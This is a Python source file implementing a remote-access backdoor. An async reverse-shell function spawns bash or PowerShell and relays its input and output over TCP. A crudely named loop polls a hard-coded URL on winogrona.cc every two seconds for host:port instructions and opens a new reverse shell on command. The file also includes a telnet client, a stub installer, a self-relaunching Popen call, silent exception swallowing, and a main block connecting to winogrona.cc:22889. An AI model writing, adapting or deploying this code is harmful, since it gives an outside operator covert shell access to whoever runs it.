import asyncio
import aiohttp # type: ignore
import sys
import telnetlib3

from dataclasses import dataclass
from threading import Thread
from subprocess import Popen
from contextlib import contextmanager
from telnetlib3.client import open_connection as open_telnet_connection
from telnetlib3 import accessories

SLEEP_PERIOD_SECS = 2

URL_STATUS = "http://erzhanoriez.winogrona.cc/data/status"

SHELL = ""
if sys.platform == 'win32':
    SHELL = "powershell.exe"
else:
    SHELL = "bash"

def excguard(coro):
    async def newfun(*args, **kwargs):
        try:
            await coro(*args, **kwargs)
        except Exception as e:
            pass
    
    return newfun

@excguard
async def revshell(host: str, port: int) -> None:
    shell = await asyncio.create_subprocess_shell(SHELL, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

    (reader, writer) = await asyncio.open_connection(host, port)

    future_readclosed = asyncio.get_running_loop().create_future()

    async def stdin_task():
        while True:
            data = await reader.read(1024)
            shell.stdin.write(data)
        
    async def stderr_task():
        while True:
            data = await shell.stderr.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)

    async def stdout_task():
        while True:
            data = await shell.stdout.read(1024)
            if len(data) == 0:
                future_readclosed.set_result(None)
                return

            writer.write(data)
    
    shell_coros = [stdin_task(), stdout_task(), stderr_task()]
    shell_tasks = [asyncio.create_task(coro) for coro in shell_coros]

    await future_readclosed
    for task in shell_tasks:
        task.cancel()

    reader.feed_eof()
    writer.close()

async def струи_СЭКСА():
    cur_stream_id = -1
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(URL_STATUS) as resp:
                    (host, port, stream_id) = (await resp.text()).split(":")
                    port = int(port)
                    stream_id = int(stream_id)

                    if stream_id > cur_stream_id:
                        asyncio.create_task(revshell(host, port))
                        cur_stream_id = stream_id

        except Exception as e:
            pass
            
        await asyncio.sleep(SLEEP_PERIOD_SECS)

if sys.platform == "win32":
    import contextlib
    import msvcrt
    import collections

class Terminal:
    """
    Context manager that yields (sys.stdin, sys.stdout) for Windows systems.

    It does not include direct manipulation of terminal modes as on POSIX systems
    due to lack of equivalent functionality in `msvcrt`.
    """

    def __init__(self, telnet_writer):
        self.telnet_writer = telnet_writer
        self._istty = sys.stdin.isatty()  # Check if stdin is a terminal.

    def __enter__(self):
        if self._istty:
            self._configure_terminal()
        return self

    def __exit__(self, *_):
        if self._istty:
            self._restore_terminal()

    def _configure_terminal(self):
        # Placeholder for configuration logic.
        # Use `msvcrt` for minimal adjustments, e.g., disabling input echo.
        self.telnet_writer.log.debug("Configuring terminal for Windows.")

    def _restore_terminal(self):
        # Placeholder for restoration logic.
        # Reset terminal settings if any changes were applied.
        self.telnet_writer.log.debug("Restoring terminal settings for Windows.")

    async def make_stdio(self):
        """
        Return (reader, writer) pair for sys.stdin, sys.stdout.

        This method is a coroutine.
        """
        reader = asyncio.StreamReader()
        reader_protocol = asyncio.StreamReaderProtocol(reader)

        loop = asyncio.get_event_loop_policy().get_event_loop()
        writer_transport, writer_protocol = await loop.connect_write_pipe(
            asyncio.streams.FlowControlMixin, sys.stdout
        )
        writer = asyncio.StreamWriter(writer_transport, writer_protocol, None, loop)

        await loop.connect_read_pipe(lambda: reader_protocol, sys.stdin)

        return reader, writer
    
async def telnet_client_shell_win32(telnet_reader, telnet_writer):
    """
    Minimal telnet client shell for Windows terminals.

    This shell performs basic input/output handling for interactive telnet sessions.
    stdin or stdout may be a pipe or file, and the escape character is used to exit.
    """
    keyboard_escape = "\x1d"

    # No need for Terminal handling (like raw mode), proceed with simpler I/O.
    linesep = "\n"
    if sys.stdin.isatty() and telnet_writer.will_echo:
        linesep = "\r\n"
    
    stdin, stdout = await Terminal(telnet_writer=telnet_writer).make_stdio()

    stdout.write(
        "Escape character is '{escape}'.{linesep}".format(
            escape=accessories.name_unicode(keyboard_escape), linesep=linesep
        ).encode()
    )

    # Start tasks for reading stdin and telnet output.
    stdin_task = accessories.make_reader_task(stdin)
    telnet_task = accessories.make_reader_task(telnet_reader)
    wait_for = {stdin_task, telnet_task}

    while wait_for:
        done, pending = await asyncio.wait(
            wait_for, return_when=asyncio.FIRST_COMPLETED
        )

        task = done.pop()
        wait_for.remove(task)

        telnet_writer.log.debug("task=%s, wait_for=%s", task, wait_for)

        # Handle client input
        if task == stdin_task:
            inp = task.result()
            if inp:
                if keyboard_escape in inp.decode():
                    # On ^], close connection to remote host
                    telnet_task.cancel()
                    wait_for.remove(telnet_task)
                    stdout.write(
                        "\033[m{linesep}Connection closed.{linesep}".format(
                            linesep=linesep
                        ).encode()
                    )
                else:
                    telnet_writer.write(inp.decode())
                    stdin_task = accessories.make_reader_task(stdin)
                    wait_for.add(stdin_task)
            else:
                telnet_writer.log.debug("EOF from client stdin")

        # Handle server output
        if task == telnet_task:
            out = task.result()

            # Check for end of connection, handle gracefully.
            if not out and telnet_reader._eof:
                if stdin_task in wait_for:
                    stdin_task.cancel()
                    wait_for.remove(stdin_task)
                stdout.write(
                    (
                        "\033[m{linesep}Connection closed "
                        "by foreign host.{linesep}"
                    ).format(linesep=linesep).encode()
                )
            else:
                stdout.write(out.encode() or b":?!?:")
                telnet_task = accessories.make_reader_task(telnet_reader)
                wait_for.add(telnet_task)


def seks_installer():
    exe = sys.executable

async def am_main(host: str, port: int) -> None:
    shell = None
    if sys.platform == "win32":
        shell = telnetlib3.telnet_client_shell
    
    else:
        shell = telnet_client_shell_win32

    (reader, writer) = await open_telnet_connection(host=host, port=port, shell=shell, encoding="utf8", term="TERM", force_binary=True)
    await writer.protocol.waiter_closed

def async_client(host: str, port: int) -> None:
    Popen([sys.executable, __file__])
    asyncio.run(am_main(host, port))

if __name__ == '__main__':
    asyncio.run(am_main(host="winogrona.cc", port=22889))
    # seks_installer()
    # asyncio.run(струи_СЭКСА())